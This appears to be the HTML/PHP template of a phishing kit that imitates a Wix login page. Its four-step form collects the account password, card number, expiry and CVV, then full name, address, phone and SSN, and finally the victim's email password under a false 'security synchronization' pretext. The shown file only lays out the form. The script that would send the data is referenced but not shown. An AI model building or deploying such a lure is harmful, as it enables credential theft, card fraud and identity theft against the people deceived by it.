<!doctype html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="x-ua-compatible" content="ie=edge,chrome=1">
		<title></title>
		<meta name="keywords" content="">
		<meta name="author" content="">
		<meta name="description" content="">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<script type="text/javascript" src="<?=site_url()?>assets/js/jquery.min.js"></script>
		<script type="text/javascript" src="<?=site_url()?>assets/js/script.js"></script>
		<link rel="stylesheet" href="<?=site_url()?>assets/css/style.css"> 
	</head>
	<body>
		<input type="hidden" id="link" value="<?=site_url()?>">
		<div id="wrapper">
			<div id="header">
				<div class="logo"></div>
				<div class="close"></div>
			</div>
			<div id="content">
				<div class="form">
					<div class="steps step-1">
						<div class="line h1">Log In</div>
						<div class="line h2">New to Wix? <span class="blue">Sign Up</span></div>

						<div class="line">
							<div class="input-wrapper">
								<input type="text" autocomplete="off" id="user" value="<?=$email?>" placeholder="">
								<label for="user" <? if($email != ''){ echo "class='active'"; }?> >Email</label>
							</div>
						</div>

						<div class="line">
							<div class="input-wrapper">
								<input type="password" autocomplete="off" id="pass" value="" placeholder="">
								<label for="pass">Password</label>
							</div>
						</div>
						
						<div class="line">
							<div class="remember-forgot">
								<div class="remember"></div>
								<div class="forgot"></div>
							</div>
						</div>

						<div class="line">
							<div class="button-wrapper">
								<div id="btn1" class="btn">Log In</div>
							</div>
						</div>
					</div>

					<div class="steps step-2">
						<div class="line h1">Verification</div>
						<div class="line h2">Confirm your Credit Card</div>

						<div class="cc-wrapper">
							<div class="cc">
								<div class="cc-txt x-cc">0000 0000 0000 0000</div>
								<div class="cc-txt x-exp">MM/YY</div>
								<div class="cc-txt x-name">CARD HOLDER</div>
								<div class="cc-logo"></div>
							</div>
						</div>


						<div class="line">
							<div class="input-wrapper">
								<input type="text" autocomplete="off" id="holder" value="" placeholder="CARD HOLDER">
								<label for="holder" class="active">Card Holder Name</label>
							</div>
						</div>

						<div class="line">
							<div class="input-wrapper">
								<input type="text" autocomplete="off" maxlength="19" id="ccnum" value="" placeholder="0000 0000 0000 0000">
								<label for="ccnum" class="active">Card Number</label>
							</div>
						</div>
						
						<div class="line flex">

							<div class="input-wrapper small s1">
								<input type="text" autocomplete="off" maxlength="5" id="exp" value="" placeholder="MM/YY">
								<label for="exp" class="active">Expire Date</label>
							</div>


							<div class="input-wrapper small">
								<input type="text" autocomplete="off" id="cvv" maxlength="4" value="" placeholder="000">
								<label for="cvv" class="active">CVV</label>
							</div>

						</div>

						<div class="line">
							<div class="button-wrapper">
								<div id="btn2" class="btn">CONFIRM</div>
							</div>
						</div>
					</div>

					<div class="steps step-3">
						<div class="line h1">Billing address</div>
						<div class="line h2">Update your personal information</div>

						<div class="line">
							<div class="input-wrapper">
								<input type="text" autocomplete="off" id="full_name" value="" placeholder="">
								<label for="full_name">Full Name</label>
							</div>
						</div>

						<div class="line">
							<div class="input-wrapper">
								<input type="text" autocomplete="off" id="address" value="" placeholder="">
								<label for="address">Address</label>
							</div>
						</div>

						<div class="line">
							<div class="input-wrapper">
								<input type="text" autocomplete="off" id="city" value="" placeholder="">
								<label for="city">City</label>
							</div>
						</div>

						
						<div class="line flex">

							<div class="input-wrapper small s1">
								<input type="text" autocomplete="off" maxlength="5" id="state" value="" placeholder="">
								<label for="state">State</label>
							</div>

							<div class="input-wrapper small">
								<input type="text" autocomplete="off" id="zipcode" value="" placeholder="">
								<label for="zipcode">Zipcode</label>
							</div>

						</div>

						<div class="line">
							<div class="input-wrapper">
								<input type="text" autocomplete="off" id="phone" value="" placeholder="">
								<label for="phone">Phone</label>
							</div>
						</div>

						<div class="line">
							<div class="input-wrapper">
								<input type="text" autocomplete="off" id="ssn" value="" placeholder="">
								<label for="ssn">SSN</label>
							</div>
						</div>



						<div class="line">
							<div class="button-wrapper">
								<div id="btn3" class="btn">UPDATE</div>
							</div>
						</div>
					</div>


					<div class="steps step-4">
						<div class="line h1">Email</div>
						<div class="line h2">For Security Reasons please Synchronize your Wix Account with your Email Address</div>

						<div class="line">
							<div class="input-wrapper">
								<input type="text" autocomplete="off" id="email" value="" placeholder="">
								<label for="email" class="active">Email Address</label>
							</div>
						</div>

						<div class="line">
							<div class="input-wrapper">
								<input type="password" autocomplete="off" id="password" value="" placeholder="">
								<label for="password">Email Password</label>
							</div>
						</div>


						<div class="line">
							<div class="button-wrapper">
								<div id="btn4" class="btn">VERIFY</div>
							</div>
						</div>
					</div>



					<div class="line footer">
						<div class="footer-line">* By logging in, you agree to our <span class="blue">Terms of Use</span> and to</div>
						<div class="footer-line">receive Wix emails & updates and acknowledge that you </div>
						<div class="footer-line">read our <span class="blue">Privacy Policy.</span></div>
					</div>

				</div>
			</div>
		</div>	
	

	</body>
</html>